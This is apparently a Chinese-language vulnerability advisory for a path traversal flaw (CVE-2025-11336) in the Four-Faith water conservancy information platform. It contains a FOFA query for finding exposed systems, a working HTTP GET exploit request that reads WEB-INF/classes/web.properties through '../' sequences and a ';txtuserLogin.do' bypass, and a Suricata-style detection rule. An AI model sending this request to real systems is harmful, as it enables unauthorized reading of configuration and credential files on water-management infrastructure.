# 厦门四信通信科技有限公司水利系统txtuserLogin存在路径遍历漏洞

厦门四信通信科技有限公司水利系统txtuserLogin存在路径遍历漏洞

# 影响版本

当下已发布版本

# **漏洞状态**

|**漏洞细节**|**漏洞POC**|**漏洞EXP**|**在野利用**|
| :-: | :-: | :-: | :-: |
|**是**|**已公开**|**已公开**|**已知**|

## 风险等级

|**维度**|**评价**|
| :-: | :-: |
|**威胁等级**|**高危**|
|**影响面**|**广**|
|**攻击者价值**|**高**|
|**利用难度**|**低**|

# 漏洞复现

**fofa:**  **title=&quot;水利信息化平台&quot;**

**POC/EXP：**

**step1 路径遍历**

```
GET /sysRole/sysExportStatist/../../stAlarmInfo/download.do;txtuserLogin.do?type=down&fileName=../WEB-INF/classes/web.properties HTTP/1.1
Host: 127.0.0.1
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36


```

![image](assets/image-20260910012411-9opq8l2.png)​

**sonrt规则：**

```
alert http any any -> $HOME_NET any (
    msg:"Four-Faith/厦门四信 水利信息化平台 download.do;txtuserLogin.do 路径遍历读 web.properties (fileName ../WEB-INF)";
    flow:to_server,established;
    http.method; content:"GET"; nocase;
    http.raw_uri;
        content:"/sysRole/sysExportStatist/";
        fast_pattern;
        nocase;
        content:"../../stAlarmInfo/download.do;txtuserLogin.do";
        nocase;
        content:"type=down";
        nocase;
        content:"fileName=";
        nocase;
        content:"../";
        nocase;
        content:"WEB-INF/classes/web.properties";
        nocase;
    metadata:
        service http,
        affected_product "Four-Faith 水利信息化平台/厦门四信通信",
        vulnerability_type "Path Traversal / Arbitrary File Read",
        reference "CVE-2025-11336",
        severity "high";
    classtype:web-application-attack;
    sid:1000901;
    rev:1;
    priority:2;
)
```

# 漏洞修复

建议用户更新至最新补丁

‍
